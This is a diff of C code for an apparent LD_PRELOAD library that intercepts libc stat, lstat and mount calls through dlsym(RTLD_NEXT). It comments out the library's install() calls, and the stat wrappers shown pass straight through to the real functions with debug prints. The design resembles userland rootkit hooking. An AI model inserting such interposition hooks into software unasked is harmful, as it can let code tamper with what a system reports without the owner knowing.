@@ -23,10 +23,10 @@ init(void)
         #endif
         uninstall();
     } else{
-        install();
+        //install();
     }
     #else
-    install();
+    //install();
     #endif
 }
 
@@ -379,6 +379,7 @@ int mount(const char *source, const char *target,
     return hooked_mount(source, target, filesystemtype, mountflags, data);
 }
 
+/*
 int lstat(const char *pathname, struct stat *buf){
     printf("[+] Hooked LSTAT :: %s \n", pathname);
     if (!hooked_xlstat){
@@ -401,3 +402,100 @@ int stat(const char *pathname, struct stat *buf){
     realpath(pathname, realpathname);
     return lstat(realpathname, buf);
 }
+*/
+
+int stat(const char *path, struct stat *buf)
+{
+    #ifdef DEBUG
+    printf("[-] hooking stat %s\n", path);
+    #endif
+    if ( hooked_stat == NULL ) {
+        hooked_stat = dlsym(RTLD_NEXT, "stat");
+    }
+
+    return __xstat(_STAT_VER, path, buf);
+} 
+
+int __xstat(int version, const char *path, struct stat *buf)
+{
+    #ifdef DEBUG
+    printf("[-] hooking xstat %s\n", path);
+    #endif
+    if ( hooked_xstat == NULL ) {
+        hooked_xstat = dlsym(RTLD_NEXT, "__xstat");
+    }
+
+    return hooked_xstat(version, path, buf);
+} 
+
+int stat64(const char *path, struct stat64 *buf)
+{
+    #ifdef DEBUG
+    printf("[-] hooking stat64 %s\n", path);
+    #endif
+    if ( hooked_stat == NULL ) {
+        hooked_stat = dlsym(RTLD_NEXT, "stat64");
+    }
+
+    return __xstat64(_STAT_VER, path, buf);
+} 
+
+int __xstat64(int version, const char *path, struct stat64 *buf)
+{
+    #ifdef DEBUG
+    printf("[-] hooking xstat64 %s\n", path);
+    #endif
+    if ( hooked_xstat64 == NULL ) {
+        hooked_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
+    }
+
+    return hooked_xstat64(version, path, buf);
+} 
+
+int lstat(const char *path, struct stat *buf)
+{
+    #ifdef DEBUG
+    printf("[-] hooking lstat %s\n", path);
+    #endif
+    if ( hooked_stat == NULL ) {
+        hooked_stat = dlsym(RTLD_NEXT, "lstat");
+    }
+
+    return __lxstat(_STAT_VER, path, buf);
+} 
+
+int __lxstat(int version, const char *path, struct stat *buf)
+{
+    #ifdef DEBUG
+    printf("[-] hooking lxstat %s\n", path);
+    #endif
+    if ( hooked_lxstat == NULL ) {
+        hooked_lxstat = dlsym(RTLD_NEXT, "__lxstat");
+    }
+
+    return hooked_lxstat(version, path, buf);
+} 
+
+int lstat64(const char *path, struct stat64 *buf)
+{
+    #ifdef DEBUG
+    printf("[-] hooking lstat64 %s\n", path);
+    #endif
+    if ( hooked_lstat64 == NULL ) {
+        hooked_lstat64 = dlsym(RTLD_NEXT, "lstat64");
+    }
+
+    return __lxstat64(_STAT_VER, path, buf);
+} 
+
+int __lxstat64(int version, const char *path, struct stat64 *buf)
+{
+    #ifdef DEBUG
+    printf("[-] hooking lxstat64 %s\n", path);
+    #endif
+    if ( hooked_lxstat64 == NULL ) {
+        hooked_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
+    }
+
+    return hooked_lxstat64(version, path, buf);
+} 
